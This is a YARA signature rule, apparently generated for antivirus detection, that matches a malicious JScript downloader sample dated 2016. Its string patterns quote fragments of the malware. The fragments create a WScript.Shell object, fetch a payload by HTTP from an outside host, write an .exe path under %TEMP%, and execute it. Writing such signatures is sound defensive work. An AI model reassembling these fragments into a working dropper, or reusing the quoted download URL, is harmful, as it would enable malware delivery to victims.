rule sig_20160330_dcb8a980bc32755bb564d86ada714ee8 {
  meta:
    description = "datamaliciousorder - file 20160330_dcb8a980bc32755bb564d86ada714ee8.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "daae4d813643d7f806067d6d2d9d76e6f8dba58e3b9dc78e4864e9e94c0ae3c4"

  strings:
    $s1  = "function _V(_VJ, _D1){_OP = _OP * 1; return _VJ - _D1;};" fullword ascii
    $s2  = "var _VE = function _U() {return WScript[_KE](\"WScript\"+\".Shell\");}(), _KN = 11;" fullword ascii
    $s3  = "_LN[_AP](\"GET\", \"http://ccluke.cn/b7eus\", false);" fullword ascii
    $s4  = "if (_LN[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _Y(){return _KB + \"\";};" fullword ascii
    $s6  = "function _MR() {return _VE[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"DQaQYwqLSSSZRiS.ex\" + \"e\";};" fullword ascii
    $s7  = "function _TU() {return ((_O == true) && (_O == _FF)) ? 1 : _OP;};" fullword ascii
    $s8  = "function _PD(_VU){_VE[\"Run\"](_VU, _OP, _OP);};" fullword ascii
    $s9  = "var _B = new this[\"Date\"]();" fullword ascii
    $s10 = " while (_C){" fullword ascii
    $s11 = "function _D(){return 22;};" fullword ascii
    $s12 = "function _PM()" fullword ascii
    $s13 = "return _V(_J, _W0);" fullword ascii
    $s14 = "function _T(_S) {var _A = (1, 2, 3, 4, 5, _S); return _A;};" fullword ascii
    $s15 = "function _F(){return _KE;};" fullword ascii
    $s16 = "var _O = false;" fullword ascii
    $s17 = "_O = true; " fullword ascii
    $s18 = "var _FF = false;" fullword ascii
    $s19 = "_FF = true; " fullword ascii
    $s20 = "var _JA = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}